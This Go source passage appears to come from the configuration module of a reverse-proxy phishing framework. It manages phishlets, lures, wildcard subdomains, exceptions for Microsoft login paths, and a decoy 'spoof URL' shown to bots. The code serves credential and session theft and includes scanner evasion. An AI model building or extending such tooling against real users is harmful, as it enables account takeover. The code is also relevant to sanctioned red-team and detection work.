func (c *Config) IsActiveHostname(host string) bool {
	if host == "" {
		return false
	}
	if host[len(host)-1:] == "." {
		host = host[:len(host)-1]
	}
	for _, h := range c.activeHostnames {
		if h == host {
			return true
		}
	}
	// Wildcard: any subdomain of an enabled phishlet's domain or alias is active
	for site, pl := range c.phishlets {
		if c.sitesEnabled[site] {
			domain, ok := c.siteDomains[pl.Name]
			if ok && strings.HasSuffix(host, "."+domain) {
				return true
			}
			// Check alias domains
			for _, aliasDom := range c.siteAliases[pl.Name] {
				if strings.HasSuffix(host, "."+aliasDom) {
					return true
				}
			}
		}
	}
	return false
}

func (c *Config) AddPhishlet(site string, pl *Phishlet) {
	c.phishletNames = append(c.phishletNames, site)
	c.phishlets[site] = pl
}

func (c *Config) AddLure(site string, l *Lure) {
	c.lures = append(c.lures, l)
	c.cfg.Set(CFG_LURES, c.lures)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetLure(index int, l *Lure) error {
	if index >= 0 && index < len(c.lures) {
		c.lures[index] = l
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	err := c.cfg.WriteConfig()
	if err != nil {
		return err
	}
	return nil
}

func (c *Config) DeleteLure(index int) error {
	if index >= 0 && index < len(c.lures) {
		c.lures = append(c.lures[:index], c.lures[index+1:]...)
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	err := c.cfg.WriteConfig()
	if err != nil {
		return err
	}
	return nil
}

func (c *Config) DeleteLures(index []int) []int {
	tlures := []*Lure{}
	di := []int{}
	for n, l := range c.lures {
		if !intExists(n, index) {
			tlures = append(tlures, l)
		} else {
			di = append(di, n)
		}
	}
	if len(di) > 0 {
		c.lures = tlures
		c.cfg.Set(CFG_LURES, c.lures)
		err := c.cfg.WriteConfig()
		if err != nil {
			log.Error("write config: %v", err)
		}
	}
	return di
}

func (c *Config) GetLure(index int) (*Lure, error) {
	if index >= 0 && index < len(c.lures) {
		return c.lures[index], nil
	} else {
		return nil, fmt.Errorf("index out of bounds: %d", index)
	}
}

func (c *Config) GetLureByPath(site, path string) (*Lure, error) {
	return c.GetLureByPathAndHost(site, path, "")
}

func (c *Config) GetLureByPathAndHost(site, path, hostname string) (*Lure, error) {
	// Helper: check if hostname is a lure-eligible host (matches lure hostname OR is any subdomain of base domain)
	isLureHost := func(lureHost, reqHost string) bool {
		if reqHost == "" || lureHost == "" || reqHost == lureHost {
			return true
		}
		// Check if reqHost is a subdomain of the same base domain
		// and NOT a known proxy host (proxy hosts handle real upstream traffic)
		if pl, ok := c.phishlets[site]; ok {
			domain, ok2 := c.siteDomains[pl.Name]
			if ok2 && strings.HasSuffix(reqHost, "."+domain) {
				// Make sure it's not a proxy host subdomain
				for _, ph := range pl.proxyHosts {
					if reqHost == ph.phish_subdomain+"."+domain {
						return false
					}
				}
				return true
			}
		}
		return false
	}

	// First try exact path match
	for _, l := range c.lures {
		if l.Phishlet == site && l.Path == path {
			if isLureHost(l.Hostname, hostname) {
				return l, nil
			}
		}
	}
	// Then try wildcard lure (path = "*") — but ONLY on lure-eligible hostnames
	// and skip root "/" and OAuth/common paths
	if path != "/" && !strings.HasPrefix(path, "/common/") && !strings.HasPrefix(path, "/organizations/") && !strings.HasPrefix(path, "/consumers/") && !strings.HasPrefix(path, "/shared/") && !strings.HasPrefix(path, "/ests/") && !strings.HasPrefix(path, "/.well-known/") {
		for _, l := range c.lures {
			if l.Phishlet == site && l.Path == "*" {
				if !isLureHost(l.Hostname, hostname) {
					continue
				}
				return l, nil
			}
		}
	}
	return nil, fmt.Errorf("lure for path '%s' not found", path)
}

func (c *Config) GetPhishlet(site string) (*Phishlet, error) {
	pl, ok := c.phishlets[site]
	if !ok {
		return nil, fmt.Errorf("phishlet '%s' not found", site)
	}
	return pl, nil
}

func (c *Config) GetPhishletNames() []string {
	return c.phishletNames
}

func (c *Config) GetSiteDomain(site string) (string, bool) {
	domain, ok := c.siteDomains[site]
	return domain, ok
}

func (c *Config) GetAllDomains() []string {
	var ret []string
	for _, dom := range c.siteDomains {
		ret = append(ret, dom)
	}
	return ret
}

func (c *Config) GetBaseDomain() string {
	return c.baseDomain
}

func (c *Config) GetServerIP() string {
	return c.serverIP
}

func (c *Config) GetRedirectUrl() string {
	return c.redirectUrl
}

// SpoofUrl — website to reverse proxy for bots/invalid visitors (Pro feature)
func (c *Config) SetSpoofUrl(url string) {
	c.spoofUrl = url
	c.cfg.Set(CFG_SPOOF_URL, url)
	log.Info("website spoofing URL set to: %s", url)
}

func (c *Config) GetSpoofUrl() string {
	return c.spoofUrl
}

func (c *Config) GetTemplatesDir() string {
	return c.templatesDir
}

func (c *Config) GetBlacklistMode() string {
	return c.blackListMode
}
